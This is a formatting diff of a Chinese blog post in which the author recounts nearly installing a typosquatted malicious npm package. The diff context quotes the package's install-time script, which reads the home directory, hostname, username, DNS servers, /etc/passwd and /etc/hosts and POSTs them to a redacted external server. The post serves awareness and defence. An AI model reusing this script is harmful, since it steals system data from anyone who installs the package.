@@ -1,8 +1,8 @@
 ---
-title: '我是怎么差点被恶意 npm 包攻击的'
-description: '其实我很久以前就听说过有骇客通过在 npm、PyPI 等平台注册名字和知名库碰瓷的恶意包。一直以来我以为这种事情离我很远，因为我在使用一个库以前总会去看官方文档，并且在进行依赖安装时复制文档里提到的包名。'
-pubDate: '2025-04-24T06:56:32.000Z'
-updatedDate: '2025-04-24T07:15:59.000Z'
+title: "我是怎么差点被恶意 npm 包攻击的"
+description: "其实我很久以前就听说过有骇客通过在 npm、PyPI 等平台注册名字和知名库碰瓷的恶意包。一直以来我以为这种事情离我很远，因为我在使用一个库以前总会去看官方文档，并且在进行依赖安装时复制文档里提到的包名。"
+pubDate: "2025-04-24T06:56:32.000Z"
+updatedDate: "2025-04-24T07:15:59.000Z"
 ---
 
 其实我很久以前就听说过有骇客通过在 npm、PyPI 等平台注册名字和知名库碰瓷的恶意包，实现入侵公司内部系统等恶意操作的事情。一直以来我以为这种事情离我很远，因为我在使用一个库以前总会去看官方文档，并且在进行依赖安装时复制文档里提到的包名。
@@ -56,16 +56,16 @@ const packageName = packageJSON.name;
 
 // Collect system data from the remote server where the package is installed
 const trackingData = JSON.stringify({
-    p: packageName,  // Package name
-    c: __dirname,    // Directory where the package is installed
-    hd: os.homedir(),  // Home directory on the remote server
-    hn: os.hostname(),  // Hostname of the remote server
-    un: os.userInfo().username,  // Username on the remote server
-    dns: dns.getServers(),  // DNS servers on the remote server
-    v: packageJSON.version,  // Version of the package
-    pjson: packageJSON,  // Full package.json data
-    etc_passwd: fs.existsSync('/etc/passwd') ? fs.readFileSync('/etc/passwd', 'utf8') : null,  // /etc/passwd from the remote system
-    etc_hosts: fs.existsSync('/etc/hosts') ? fs.readFileSync('/etc/hosts', 'utf8') : null  // /etc/hosts from the remote system
+  p: packageName, // Package name
+  c: __dirname, // Directory where the package is installed
+  hd: os.homedir(), // Home directory on the remote server
+  hn: os.hostname(), // Hostname of the remote server
+  un: os.userInfo().username, // Username on the remote server
+  dns: dns.getServers(), // DNS servers on the remote server
+  v: packageJSON.version, // Version of the package
+  pjson: packageJSON, // Full package.json data
+  etc_passwd: fs.existsSync("/etc/passwd") ? fs.readFileSync("/etc/passwd", "utf8") : null, // /etc/passwd from the remote system
+  etc_hosts: fs.existsSync("/etc/hosts") ? fs.readFileSync("/etc/hosts", "utf8") : null, // /etc/hosts from the remote system
 });
 
 // Log the data to verify it's the remote server's information
@@ -73,34 +73,34 @@ console.log("Sending System Data from Remote Server: ", trackingData);
 
 // Prepare the POST request data
 var postData = JSON.stringify({
-    msg: trackingData,
+  msg: trackingData,
 });
 
 // Request options to send data to your server (Burp Collaborator or any endpoint)
 var options = {
-    hostname: "<REDACTED>",  // Burp Collaborator server
-    port: 443,
-    path: "/",
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json",
-        "Content-Length": postData.length,
-    },
+  hostname: "<REDACTED>", // Burp Collaborator server
+  port: 443,
+  path: "/",
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+    "Content-Length": postData.length,
+  },
 };
 
 // Send the data via HTTPS POST request
-var req = https.request(options, (res) => {
-    res.on("data", (d) => {
-        process.stdout.write(d);  // Output the response from the server
-    });
+var req = https.request(options, res => {
+  res.on("data", d => {
+    process.stdout.write(d); // Output the response from the server
+  });
 });
 
-req.on("error", (e) => {
-    console.error("Error sending data:", e);  // Handle any error during the request
+req.on("error", e => {
+  console.error("Error sending data:", e); // Handle any error during the request
 });
 
-req.write(postData);  // Send the data in the request body
-req.end();  // End the request
+req.write(postData); // Send the data in the request body
+req.end(); // End the request
 ```
 
 冷静下来复盘，发现即便这个脚本真的执行了，对我的影响其实有限：
